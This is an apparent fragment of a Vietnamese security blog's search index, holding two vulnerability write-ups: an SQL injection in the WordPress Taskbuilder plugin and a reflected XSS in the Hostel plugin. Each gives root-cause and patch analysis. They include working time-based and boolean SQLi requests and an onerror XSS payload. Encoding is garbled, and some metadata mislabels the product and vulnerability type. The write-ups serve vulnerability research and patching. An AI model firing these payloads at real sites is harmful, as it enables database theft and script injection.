chung c·ªßa file hi·ªán t·∫°i\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o n·ªôi dung ch√≠nh (body) c·ªßa modal ob_start(); // ... render HTML danh s√°ch users $body = ob_get_clean(); // B·∫Øt ƒë·∫ßu buffer ƒë·ªÉ t·∫°o ph·∫ßn footer c·ªßa modal ob_start(); // ... render HTML c√°c n√∫t thao t√°c (Close, Save) $footer = ob_get_clean(); // Tr·∫£ d·ªØ li·ªáu JSON ƒë·ªÉ frontend hi·ªÉn th·ªã modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: L·∫•y d·ªØ li·ªáu project t·ª´ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay v√¨ xu·∫•t tr·ª±c ti·∫øp, gi√∫p gom n·ªôi dung v√†o bi·∫øn. $body / $footer: Ch·ª©a n·ªôi dung HTML ƒë·ªông c·ªßa modal. json_encode(): Tr·∫£ JSON cho client, c√≥ kh·∫£ nƒÉng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong Ajax ƒë·ªÉ hi·ªÉn th·ªã modal m√† kh√¥ng c·∫ßn refresh trang. File n·∫±m trong th∆∞ m·ª•c includes cho th·∫•y r·∫±ng n√≥ s·∫Ω ƒë∆∞·ª£c g·ªçi ·ªü 1 ch·ª©c nƒÉng n√†o ƒë√≥ ·ªü n∆°i kh√°c. ƒê·ªÉ bi·∫øt ch·ª©c nƒÉng n√†o s·ª≠ d·ª•ng n√≥, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_users.php trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ N√≥ ƒë∆∞·ª£c include trong h√†m wppm_get_users() c·ªßa class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() l√† callback c·ªßa action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. wp_ajax_wppm_get_users l√† t√™n hook Ajax, v·ªõi quy t·∫Øc ƒë·∫∑t t√™n: wp_ajax_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ƒë√£ ƒëƒÉng nh·∫≠p. wp_ajax_nopriv_{action} =\u0026gt; X·ª≠ l√Ω Ajax khi user ch∆∞a ƒëƒÉng nh·∫≠p. ·ªû ƒë√¢y, action = wppm_get_users. Nghƒ©a l√† n·∫øu trong Ajax request b·∫°n g·ª≠i action=wppm_get_users t·ªõi admin-ajax.php, th√¨ WordPress s·∫Ω t√¨m callback t∆∞∆°ng ·ª©ng ƒë·ªÉ x·ª≠ l√Ω, ·ªü ƒë√¢y l√† wppm_get_users(). üëâ Ta ƒë√£ bi·∫øt ƒë∆∞·ª£c action = wppm_get_users, ki·ªÉm tra xem Ajax n√†o s·ª≠ d·ª•ng action n√†y b·∫±ng c√°ch t√¨m t·ª´ kh√≥a wppm_get_users tr√™n c√°c file .js trong th∆∞ m·ª•c ch·ª©a plugin.\nAction wppm_get_users l√† ph·∫ßn data trong request POST c·ªßa h√†m wppm_get_users()\nH√†m wppm_get_users() s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t trong HTML attribute c·ªßa ch·ª©c nƒÉng project\nT·∫°o project m·ªõi Truy c·∫≠p v√†o project ƒë√≥ Inspect code v√† t√¨m h√†m wppm_get_users s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t ·ªü ƒë√¢u, h√†nh ƒë·ªông n√†o s·∫Ω g·ªçi n√≥ üëâ Khi click v√†o icon b√™n c·∫°nh Users ajax s·∫Ω ho·∫°t ƒë·ªông, g·ª≠i request ƒë·∫øn server, l·∫•y danh s√°ch c√°c user tham gia project v√† m√£ HTML hi·ªÉn th·ªã n√≥.\nExploit Detect SQLi B·∫Øt request b·∫±ng BurpSuite, g·ª≠i request v·ªõi SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id ƒë√∫ng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name ƒë∆∞·ª£c t√¥i ƒë·∫∑t t√™n l√† wordpress n√™n k√≠ t·ª± ƒë·∫ßu ti√™n l√† w t∆∞∆°ng ·ª©ng v·ªõi m√£ HEX l√† 0x77 {: .prompt-info }\nS·ª≠ d·ª•ng SUBSTRING(STRING,1,1) ƒë·ªÉ l·∫•y k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa chu·ªói\n·ªû ƒë√¢y, $proj_id b·∫±ng 4 v√¨ SUBSTRING('wordpress',1,1)=0x77 l√† ƒë√∫ng n√™n SELECT l·∫•y gi√° tr·ªã ƒë√∫ng trong IF(condition, value if true, value if false), 4 l√† gi√° tr·ªã c√≥ th·ª±c trong database, n√™n response tr·∫£ v·ªÅ ch·ª©a danh s√°ch ng∆∞·ªùi tham gia d·ª± √°n\nS·ª≠ d·ª•ng HEX technique ƒë·ªÉ bypass h√†m esc_sql() ·ªü tr√™n, d√πng ƒë·ªÉ so s√°nh khi kh√¥ng s·ª≠ d√πng ƒë∆∞·ª£c '\nG·ª≠i request v·ªõi SQLi payload boolean base v√≥i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) V·ªõi proj_id kh√¥ng c√≥ th·ª±c trong database, response s·∫Ω tr·∫£ v·ªÅ k·∫øt qu·∫£ ch·ª©a None\nüëâ Ta ƒë√£ l·∫•y ƒë∆∞·ª£c k√≠ t·ª± ƒë·∫ßu ti√™n c·ªßa database name b·∫±ng k·ªπ thu·∫≠t boolean base\nproj_id ƒë√πng: response kh√¥ng ch·ª©a None proj_id sai: response ch·ª©a None C√≥ th·ªÉ s·ª≠ d·ª•ng k·ªπ thu·∫≠t time base nh∆∞ng khi dump s·ªë l∆∞·ª£ng l·ªõn data, th·ªùi gian dump s·∫Ω r·∫•t l√¢u {: .prompt-info }\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t boolean base ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-39569 trong plugin WordPress Taskbuilder xu·∫•t ph√°t t·ª´ vi·ªác thi·∫øu d·∫•u nh√°y ƒë∆°n '...' bao quanh d·ªØ li·ªáu ƒë·∫ßu v√†o trong c√¢u l·ªánh SQL, khi·∫øn d·ªØ li·ªáu ng∆∞·ªùi d√πng c√≥ th·ªÉ ƒë∆∞·ª£c di·ªÖn gi·∫£i nh∆∞ m·ªôt ph·∫ßn c·ªßa c√¢u l·ªánh SQL h·ª£p l·ªá.\nB·∫£n v√° ·ªü phi√™n b·∫£n 4.0.2 ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch ƒë∆∞a $proj_id v√†o trong '...', ƒë·∫£m b·∫£o n√≥ lu√¥n ƒë∆∞·ª£c x·ª≠ l√Ω nh∆∞ m·ªôt literal string trong SQL.\nKey takeaways:\n∆Øu ti√™n s·ª≠ d·ª•ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay v√¨ t·ª± ch√®n d·ªØ li·ªáu v√†o query. ƒê·ªëi v·ªõi c√°c plugin WordPress, c·∫ßn test k·ªπ l∆∞·ª°ng c√°c Ajax endpoint v√¨ ƒë√¢y l√† n∆°i d·ªÖ xu·∫•t hi·ªán SQLi v√† XSS nh·∫•t. Ng∆∞·ªùi qu·∫£n tr·ªã c·∫ßn th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin/theme ƒë·ªÉ nh·∫≠n b·∫£n v√° k·ªãp th·ªùi. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-08-31-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) v√† v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003e·ª®ng d·ª•ng ƒë√£ \u003cstrong\u003ex·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o\u003c/strong\u003e tr∆∞·ªõc khi ƒë∆∞a v√†o c√¢u SQL. Tuy nhi√™n, trong qu√° tr√¨nh x√¢y d·ª±ng truy v·∫•n, gi√° tr·ªã n√†y ƒë∆∞·ª£c ch√®n tr·ª±c ti·∫øp m√† kh√¥ng ƒë∆∞·ª£c bao trong d·∫•u nh√°y ƒë∆°n \u003ccode\u003e'...'\u003c/code\u003e. ƒêi·ªÅu ƒë√≥ khi·∫øn k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ch√®n th√™m c√°c th√†nh ph·∫ßn c√∫ ph√°p SQL h·ª£p l·ªá (nh∆∞ \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) v√†o truy v·∫•n, d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Hostel c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.1.5.8. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ admin.\nCVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.7(vul) v√† v1.1.5.8(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán sanitize (l√†m s·∫°ch d·ªØ li·ªáu) v√† escape (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng Reflected Cross-Site Scripting (XSS)\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file views/bookings.html.php v√† controllers/bookings.php\nFile views/bookings.html.php\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.7\u0026rdquo; }\nTham s·ªë ob ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['ob'] v√† echo ra HTML attribute m√† kh√¥ng c√≥ b·∫•t k√¨ x·ª≠ l√Ω escape n√†o. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn nguy c∆° Reflected XSS (Cross-Site Scripting), v√¨ attacker c√≥ th·ªÉ ch√®n payload v√†o query string,\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.8\u0026rdquo; }\nB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ encode $_GET['ob'] th√†nh d·∫°ng an to√†n tr∆∞·ªõc khi echo ra HTML attribute.\nSource: $_GET['ob'] l√† d·ªØ li·ªáu nh·∫≠p t·ª´ client (URL query string), attacker c√≥ th·ªÉ ki·ªÉm so√°t ho√†n to√†n. Sink: echo trong HTML attribute ob=\u0026lt;?php echo @$_GET['ob']?\u0026gt; üëâ V√¨ source kh√¥ng ƒëi qua logic c·ªßa controllers n√™n ta kh√¥ng c·∫ßn quan t√¢m diff c·ªßa controllers/bookings.php\nHow it work? ƒê·ªÉ $_GET['ob'] ƒë∆∞·ª£c echo ra HTML attribute c·ªßa th·∫ª \u0026lt;a\u0026gt; th√¨ ƒëi·ªÅu ki·ªán trong kh·ªëi if ch·ª©a th·∫ª \u0026lt;a\u0026gt; ph·∫£i true\n\u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; // ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt; \u0026lt;?php endif;?\u0026gt;\t{: file=\u0026ldquo;views/bookings.html.php\u0026rdquo; }\nüëâ ƒêi·ªÅu ki·ªán quan tr·ªçng c·∫ßn ch√∫ √Ω l√† if($offset \u0026gt; 0), v√¨ ch·ªâ c·∫ßn ƒëi·ªÅu ki·ªán n√†y ƒë√∫ng th√¨ XSS ƒë√£ c√≥ th·ªÉ x·∫£y ra. Kh√¥ng c·∫ßn quan t√¢m if($count \u0026gt; ($page_limit + $offset)).\nFile views/bookings.html.php kh√¥ng th·ªÉ truy c·∫≠p tr·ª±c ti·∫øp, m√† ph·∫£i ƒë∆∞·ª£c controllers g·ªçi th√¥ng qua h√†m include()\nBi·∫øn $offset ƒë∆∞·ª£c controller kh·ªüi t·∫°o tr∆∞·ªõc r·ªìi truy·ªÅn sang view (views/bookings.html.php) ƒë·ªÉ d√πng trong m·ªánh ƒë·ªÅ if.\nƒê·ªÉ x√°c ƒë·ªãnh controller n√†o g·ªçi file view n√†y, ta t√¨m ki·∫øm bi·∫øn $offset trong th∆∞ m·ª•c controllers c·ªßa plugin.\nK·∫øt qu·∫£ cho th·∫•y $offset ƒë∆∞·ª£c t·∫°o trong nh√°nh default (listing bookings) c·ªßa h√†m tƒ©nh manage() trong class WPHostelBookings, n·∫±m ·ªü file controllers/bookings.php.\nController Code\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { // other logic // list bookings default: // which bookings to show - upcoming or past? $type = empty($_GET[\u0026#39;type\u0026#39;]) ? \u0026#39;upcoming\u0026#39; : sanitize_text_field($_GET[\u0026#39;type\u0026#39;]); $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); $dir = empty($_GET[\u0026#39;dir\u0026#39;]) ? \u0026#39;ASC\u0026#39; : $_GET[\u0026#39;dir\u0026#39;]; if($dir != \u0026#39;ASC\u0026#39; and $dir != \u0026#39;DESC\u0026#39;) $dir = \u0026#39;ASC\u0026#39;; $odir = ($dir == \u0026#39;ASC\u0026#39;) ? \u0026#39;DESC\u0026#39; : \u0026#39;ASC\u0026#39;; // other logic // define limit (as it\u0026#39;s paginated)\t$page_limit = 20; $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; // other logic\t$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); $count = $wpdb-\u0026gt;get_var(\u0026#34;SELECT FOUND_ROWS()\u0026#34;);\t// other logic if(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tbreak; } } } {: file=\u0026ldquo;controllers/bookings.php v1.1.5.7\u0026rdquo; }\nPh√¢n t√≠ch bi·∫øn $offset\nBi·∫øn $offset ƒë∆∞·ª£c kh·ªüi t·∫°o t·ª´ tham s·ªë offset trong URL ($_GET['offset']):\nN·∫øu kh√¥ng c√≥ tham s·ªë =\u0026gt; m·∫∑c ƒë·ªãnh 0. N·∫øu c√≥ =\u0026gt; √©p ki·ªÉu s·ªë nguy√™n b·∫±ng intval(). $offset = empty($_GET[\u0026#39;offset\u0026#39;]) ? 0 : intval($_GET[\u0026#39;offset\u0026#39;]); Ph√¢n t√≠ch bi·∫øn $page_limit\n$page_limit ƒë∆∞·ª£c ƒë·∫∑t c·ªë ƒë·ªãnh l√† 20, d√πng k·∫øt h·ª£p v·ªõi $offset ƒë·ªÉ ph√¢n trang:\n// define limit (as it\u0026#39;s paginated)\t$page_limit = 20; // LIMIT offset, 20 $limit_sql = empty($_GET[\u0026#39;export\u0026#39;]) ? $wpdb-\u0026gt;prepare(\u0026#34;LIMIT %d, %d\u0026#34;, $offset, $page_limit) : \u0026#39;\u0026#39;; Khi ƒë√≥ SQL tr·∫£ v·ªÅ t·ªëi ƒëa 20 b·∫£n ghi, b·∫Øt ƒë·∫ßu t·ª´ v·ªã tr√≠ $offset.\n√Åp d·ª•ng v√†o m·ªánh ƒë·ªÅ if:\nTrong view, ƒëo·∫°n code XSS payload ch·ªâ hi·ªÉn th·ªã khi:\nif($offset \u0026gt; 0) =\u0026gt; t·ª©c l√† ph·∫£i c√≥ offset t·ª´ 1 tr·ªü l√™n. Mu·ªën offset \u0026gt; 0 c√≥ √Ω nghƒ©a, c∆° s·ªü d·ªØ li·ªáu ph·∫£i c√≥ √≠t nh·∫•t 2 booking. N·∫øu ch·ªâ c√≥ 1 booking th√¨ sau khi b·ªè qua 1 d√≤ng (offset=1), kh√¥ng c√≤n d·ªØ li·ªáu n√†o ƒë·ªÉ hi·ªÉn th·ªã, n√™n payload c≈©ng kh√¥ng render ra. üëâ Do ƒë√≥, ƒë·ªÉ khai th√°c th√†nh c√¥ng, c·∫ßn c√≥ t·ªëi thi·ªÉu 2 booking trong database.\nCu·ªëi c√πng c√°c k·∫øt qu·∫£ ƒë∆∞·ª£c ch·ª©a trong c√°c bi·∫øn s·∫Ω ƒë∆∞·ª£c hi·ªÉn th·ªã ra views th√¥ng qua h√†m include()\nif(@file_exists(get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;)) include get_stylesheet_directory().\u0026#39;/wphostel/bookings.html.php\u0026#39;; else include(WPHOSTEL_PATH.\u0026#34;/views/bookings.html.php\u0026#34;);\tWPHOSTEL_PATH c√≥ th·ªÉ l√† h·∫±ng global ƒë∆∞·ª£c s·ª≠ d·ª•ng sau khi file PHP ch·ª©a n√≥ ƒë∆∞·ª£c load, ƒê·ªÉ bi·∫øt ƒë∆∞·ª£c ch√≠nh x√°c, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a WPHOSTEL_PATH.\nüëâ WPHOSTEL_PATH b√¢y gi·ªù l√† ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi t·ªõi th∆∞ m·ª•c ch·ª©a file hi·ªán t·∫°i.\nExploit Request v·ªõi XSS payload\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;offset=1\u0026amp;ob=\u0026#34;\u0026gt;\u0026lt;img+src%3D1+onerror%3Dalert%28document.domain%29\u0026gt; HTTP/1.1 Payload th·ª±c t·∫ø:\n\u0026#34;\u0026gt;\u0026lt;img src=x onerror=alert(document.domain)\u0026gt; ƒê√≥ng th·∫ª \u0026lt;a\u0026gt; b·∫±ng k√Ω t·ª± \u0026quot;\u0026gt;. Ch√®n th√™m th·∫ª \u0026lt;img\u0026gt; c√≥ thu·ªôc t√≠nh onerror ƒë·ªÉ k√≠ch ho·∫°t JavaScript. D√πng alert(document.domain) thay cho alert(1) nh∆∞ m·ªôt th√≥i quen, nh·∫±m ch·ª©ng minh r√µ r√†ng kh·∫£ nƒÉng ƒë·ªçc th√¥ng tin t·ª´ DOM. ƒêi·ªÅu n√†y c≈©ng gi√∫p tr√°nh tr∆∞·ªùng h·ª£p Sandbox Domain khi·∫øn cho t√°c ƒë·ªông c·ªßa payload b·ªã xem nh·∫π ho·∫∑c kh√¥ng c√≥. K·∫øt qu·∫£:\nConclusion L·ªó h·ªïng CVE-2025-6234 trong plugin WordPress Hostel b·∫Øt ngu·ªìn t·ª´ vi·ªác kh√¥ng x·ª≠ l√Ω ƒë√∫ng d·ªØ li·ªáu ƒë·∫ßu v√†o ($_GET['ob']) tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n giao di·ªán. ƒêi·ªÅu n√†y m·ªü ra kh·∫£ nƒÉng cho attacker ch√®n m√£ ƒë·ªôc Reflected XSS.\nB·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ escape d·ªØ li·ªáu tr∆∞·ªõc khi in ra HTML, ƒë·∫£m b·∫£o r·∫±ng c√°c gi√° tr·ªã kh√¥ng tin c·∫≠y kh√¥ng th·ªÉ ch√®n script ƒë·ªôc h·∫°i.\nKey takeaways:\nLu√¥n sanitize d·ªØ li·ªáu ƒë·∫ßu v√†o v√† escape d·ªØ li·ªáu ƒë·∫ßu ra theo ng·ªØ c·∫£nh (context). V·ªõi WordPress, t·∫≠n d·ª•ng c√°c h√†m built-in nh∆∞ sanitize_text_field(), esc_attr(), esc_html(), wp_kses()\u0026hellip; ƒë·ªÉ gi·∫£m thi·ªÉu r·ªßi ro b·∫£o m·∫≠t. References XSSCross-site scripting (XSS) cheat sheet - PortSwigger\nWordPress Hostel Plugin \u0026lt; 1.1.5.8 is vulnerable to Cross Site Scripting (XSS) - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-08-28-cve-2025-6234/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eHostel\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.8\u003c/strong\u003e. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ \u003cstrong\u003eadmin\u003c/strong\u003e.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-6234\"\u003eCVE-2025-6234\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 1.1.5.8\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: Medium 